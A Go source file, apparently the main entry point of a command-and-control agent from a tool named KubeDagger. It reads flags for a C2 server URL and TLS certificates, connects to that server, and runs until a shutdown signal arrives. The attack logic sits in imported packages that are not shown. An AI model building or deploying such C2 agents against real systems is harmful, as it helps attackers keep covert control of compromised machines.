package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/sirupsen/logrus"
	"github.com/yasindce1998/KubeDagger/pkg/agent"
	"github.com/yasindce1998/KubeDagger/pkg/c2server"
)

func main() {
	var (
		serverURL = flag.String("server", "https://127.0.0.1:443", "C2 server URL")
		agentID   = flag.String("id", "", "agent ID (auto-generated if empty)")
		caPath    = flag.String("ca", "", "path to CA cert PEM for server verification")
		certPath  = flag.String("cert", "", "path to agent client cert PEM")
		keyPath   = flag.String("key", "", "path to agent client key PEM")
		plaintext = flag.Bool("plaintext", false, "disable TLS (development only)")
		logLevel  = flag.String("log-level", "info", "log level")
	)
	flag.Parse()

	level, err := logrus.ParseLevel(*logLevel)
	if err != nil {
		logrus.Fatalf("invalid log level: %v", err)
	}
	logrus.SetLevel(level)

	var transport *agent.Transport
	if *plaintext {
		transport = agent.NewTransport(*serverURL, nil)
	} else {
		tlsCfg, err := buildAgentTLS(*caPath, *certPath, *keyPath)
		if err != nil {
			logrus.Fatalf("TLS setup: %v", err)
		}
		transport = agent.NewTransport(*serverURL, tlsCfg)
	}

	cfg := agent.Config{
		ServerURL: *serverURL,
		AgentID:   *agentID,
	}

	a := agent.New(cfg, transport)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		logrus.Info("signal received, shutting down")
		a.Stop()
		cancel()
	}()

	if err := a.Run(ctx); err != nil && err != context.Canceled {
		logrus.Fatalf("agent exited: %v", err)
	}
}

func buildAgentTLS(caPath, certPath, keyPath string) (*tls.Config, error) {
	if caPath == "" || certPath == "" || keyPath == "" {
		return nil, fmt.Errorf("--ca, --cert, and --key are required when TLS is enabled")
	}

	caPEM, err := os.ReadFile(caPath)
	if err != nil {
		return nil, fmt.Errorf("read CA: %w", err)
	}

	certPEM, err := os.ReadFile(certPath)
	if err != nil {
		return nil, fmt.Errorf("read cert: %w", err)
	}

	keyPEM, err := os.ReadFile(keyPath)
	if err != nil {
		return nil, fmt.Errorf("read key: %w", err)
	}

	agentCert := &c2server.CertPair{CertPEM: certPEM, KeyPEM: keyPEM}
	return c2server.BuildAgentTLSConfig(agentCert, caPEM)
}
